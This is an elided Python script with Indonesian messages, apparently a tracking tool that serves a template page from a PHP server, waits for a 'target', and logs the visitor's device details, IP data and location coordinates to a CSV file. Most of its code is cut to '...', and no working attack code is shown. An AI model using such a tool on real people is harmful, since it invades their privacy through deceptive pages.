...
def banner():
  ...
  ExaLine Projects
   Made By : whysixmift  '''
	...
	utils.print(f'{G}[>] {C}Created By   : {W}whysixmift')
	utils.print(f'{G} |---> {C}GitHub    : {W}github.com/whysixmift')
	utils.print(f'{G} |---> {C}Community : {W}whysixethicalgroups')
	utils.print(f'{G}[>] {C}Version      : {W}{VERSION}\n')


def template_select(site):
	utils.print(f'{Y}Templat Disini:{W}\n')
		...
		try:
			...
			if php_sc == 200:
				if preoc:
					...
					utils.print(f'{Y}[!] Server Sudah Berjalan!{W}')
					print()
				else:
					utils.print(f'{C}[ {G}✔{C} ]{W}')
					print()
...
def wait():
	...
	while True:
		...
		if size == 0 and printed is False:
			utils.print(f'{G}[+] {C}Menunggu Target...{Y}[ctrl+c Untuk Keluar]{W}\n')
			printed = True
		if size > 0:
			data_parser()
			printed = False
...
def data_parser():
	...
	try:
		...
		utils.print(f'''{Y}[!] Informasi Perangkat:{W}
...
''')
		...
		if ip_address(var_ip).is_private:
			utils.print(f'{Y}[!] IP Terprivat{W}')
		else:
			...
			if s_code == 200:
				...
				utils.print(f'''{Y}[!] Informasi IP:{W}
	...
	with open(RESULT, 'r') as result_file:
		...
		try:
			...
			if status == 'success':
				...
				utils.print(f'''{Y}[!] Informasi Lokasi Dan Koordinat :{W}
...
def csvout(row):
	...
	utils.print(f'{G}[+] {C}Data Di Simpan : {W}{path_to_script}/db/results.csv\n')
...
try:
	...
	utils.print(f'{R}[-] {C}Keyboard Terintteruprt.{W}')
	cl_quit(SERVER_PROC)
else:
	repeat()
